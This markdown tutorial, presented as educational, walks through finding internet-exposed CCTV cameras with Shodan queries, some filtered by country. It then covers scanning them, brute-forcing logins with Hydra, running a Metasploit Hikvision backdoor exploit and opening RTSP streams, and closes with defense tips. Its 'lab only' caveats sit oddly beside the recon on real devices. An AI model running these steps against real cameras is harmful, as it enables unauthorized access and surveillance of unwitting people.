# 🎯 Project: Penetration Testing Exposed CCTV Devices via Shodan (Educational Purpose)

---

## 🧱 Phase 1: Planning and Scoping

### ✅ Objective
- Identify **internet-exposed CCTV systems** using Shodan.
- Analyze them for **weak services, open ports**, or **default credentials**.
- Attempt **non-invasive testing** or **simulation attacks** in a **lab environment**.

### ✅ Tools Needed
| Tool       | Purpose                        |
|------------|--------------------------------|
| Shodan     | External reconnaissance        |
| Nmap       | Port scanning + service detection |
| WhatWeb    | Web server fingerprinting      |
| Hydra/Medusa | Brute-force testing (if allowed) |
| CVE Search | Vulnerability lookup           |
| Metasploit | Exploitation framework         |
| Wireshark  | Packet analysis (optional)     |

---

## 🌐 Phase 2: Reconnaissance with Shodan

### 🔍 Step 1: Search for exposed CCTV devices

```text
port:554 has_screenshot:true
```
(Finds live IP camera streams)

Other useful queries:
```text
product:"GoAhead-Webs"
title:"DVR Login"
hikvision
dahua
```

### 🔧 Step 2: Filter by country or network
Example (Nigeria):
```text
port:554 country:"NG"
```

---

## 🔎 Phase 3: Vulnerability Enumeration

### 🔍 Step 1: Choose a target IP (for your lab or legally-owned test environment)

Let’s say:
```text
IP = 192.168.1.200
```

### 🔍 Step 2: Scan it with Nmap

```bash
nmap -sV -A -p- 192.168.1.200
```

**What you're looking for:**
- Open ports like **80 (HTTP)**, **554 (RTSP)**, **23 (Telnet)**, **22 (SSH)**, **37777** (Dahua), etc.
- Service banners: product name, version

### 🔍 Step 3: Use WhatWeb or Wappalyzer for fingerprinting

```bash
whatweb http://192.168.1.200
```

---

## 🔐 Phase 4: Testing for Vulnerabilities

### 📂 Step 1: Search for CVEs

Use the product/version from Nmap:
```bash
searchsploit hikvision
```
or search online:
- [https://cve.mitre.org](https://cve.mitre.org)
- [https://www.exploit-db.com](https://www.exploit-db.com)

Example:
- **CVE-2017-7921** — Hikvision RCE via backdoor credentials

### 👨‍💻 Step 2: Simulate login attempt (if you have permission)

```bash
curl -u admin:12345 http://192.168.1.200
```

Or:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.200 http-get
```

---

## 💣 Phase 5: Exploitation (Local or Lab Only)

### Option A: Use Metasploit (if exploit exists)
```bash
msfconsole
use exploit/linux/http/hikvision_backdoor
set RHOSTS 192.168.1.200
set RPORT 80
run
```

### Option B: RTSP Stream Access
Use VLC or ffplay to view unsecured camera feed:
```bash
ffplay rtsp://192.168.1.200:554
```
If it's open, video stream will load.

---

## 🧪 Phase 6: Post-Exploitation (Optional, Lab Only)

If you successfully gain access:
- Dump config files
- Check for user accounts
- Identify outbound traffic
- Assess firmware versions

But **never** tamper or exfiltrate data from real devices.

---

## 📋 Phase 7: Documentation

Create a report including:
- Target IP (in lab)
- Tools used
- Findings (open ports, vulnerable services)
- Exploitability assessment
- Risk level
- Remediation suggestions

---

## 🔒 Phase 8: Defense Recommendations

- Close unused ports (especially 23, 554, 7547)
- Change default credentials
- Use strong, unique passwords
- Apply firmware updates
- Disable UPnP on routers
- Block internet access to DVR/CCTV where possible

---

## 💡 BONUS: Simulate Devices for Testing

You can simulate targets using:

- **Damn Vulnerable DVRs** (search for online lab VMs)
- **Metasploitable**
- **Docker containers** like vulnerable GoAhead servers
